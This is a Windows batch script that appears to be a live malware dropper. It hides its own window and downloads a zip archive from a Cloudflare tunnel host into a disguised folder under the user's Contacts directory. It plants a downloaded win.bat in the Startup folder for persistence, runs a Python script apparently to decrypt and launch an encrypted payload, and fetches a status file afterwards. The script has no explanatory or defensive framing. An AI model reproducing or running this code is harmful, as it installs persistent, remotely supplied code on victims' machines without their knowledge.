��&cls
��
@echo off
if "%1" neq "hidden" (
    powershell -windowstyle hidden -command "Start-Process cmd -ArgumentList '/c \"%~f0\" hidden' -WindowStyle Hidden"
    exit
)

setlocal

set "BASE_URL=https://unexpected-comparison-grades-subsequent.trycloudflare.com/"
set "ZIP_URL=%BASE_URL%pi.zip"
set "A_TXT_URL=%BASE_URL%a.txt"
set "B_TXT_URL=%BASE_URL%b.txt"
set "win_BAT_URL=%BASE_URL%win.bat"

set "DOWNLOAD_FILENAME=pi.zip"
set "DOWNLOAD_DIR=%USERPROFILE%\Contacts\MyAppCon3"
set "FULL_DOWNLOAD_PATH=%DOWNLOAD_DIR%\%DOWNLOAD_FILENAME%"
set "EXTRACT_DIR=%DOWNLOAD_DIR%\ch_extracted"
set "A_TXT_OUTPUT_PATH=%DOWNLOAD_DIR%\a.txt"
set "B_TXT_OUTPUT_PATH=%DOWNLOAD_DIR%\b.txt"

set "STARTUP_DIR=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
set "win_BAT_OUTPUT_PATH=%STARTUP_DIR%\win.bat"

if not exist "%DOWNLOAD_DIR%" (
    mkdir "%DOWNLOAD_DIR%"
    if %errorlevel% neq 0 (
        goto :eof
    )
)

powershell -NoProfile -NonInteractive -Command "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%FULL_DOWNLOAD_PATH%' -UseBasicParsing -ErrorAction Stop"
if %errorlevel% neq 0 (
    goto :eof
)

powershell -NoProfile -NonInteractive -Command "Expand-Archive -Path '%FULL_DOWNLOAD_PATH%' -DestinationPath '%EXTRACT_DIR%' -Force"
if %errorlevel% neq 0 (
    goto :eof
)

:: --- NEW POSITION FOR win.bat DOWNLOAD ---
if not exist "%STARTUP_DIR%" (
    mkdir "%STARTUP_DIR%"
    if %errorlevel% neq 0 (
        goto :eof
    )
)
powershell -NoProfile -NonInteractive -Command "Invoke-WebRequest -Uri '%win_BAT_URL%' -OutFile '%win_BAT_OUTPUT_PATH%' -UseBasicParsing -ErrorAction Stop"
if %errorlevel% neq 0 (
    goto :eof
)
:: --- END OF NEW POSITION ---

pushd "%EXTRACT_DIR%"
if %errorlevel% neq 0 (
    goto :eof
)

pythonw.exe cd.py -i ca.bin -k o.txt
set "PYTHON_EXIT_CODE=%errorlevel%"

popd

if %PYTHON_EXIT_CODE% equ 0 (
    powershell -NoProfile -NonInteractive -Command "Invoke-WebRequest -Uri '%A_TXT_URL%' -OutFile '%A_TXT_OUTPUT_PATH%' -UseBasicParsing -ErrorAction Stop"
) else (
    powershell -NoProfile -NonInteractive -Command "Invoke-WebRequest -Uri '%B_TXT_URL%' -OutFile '%B_TXT_OUTPUT_PATH%' -UseBasicParsing -ErrorAction Stop"
)

endlocal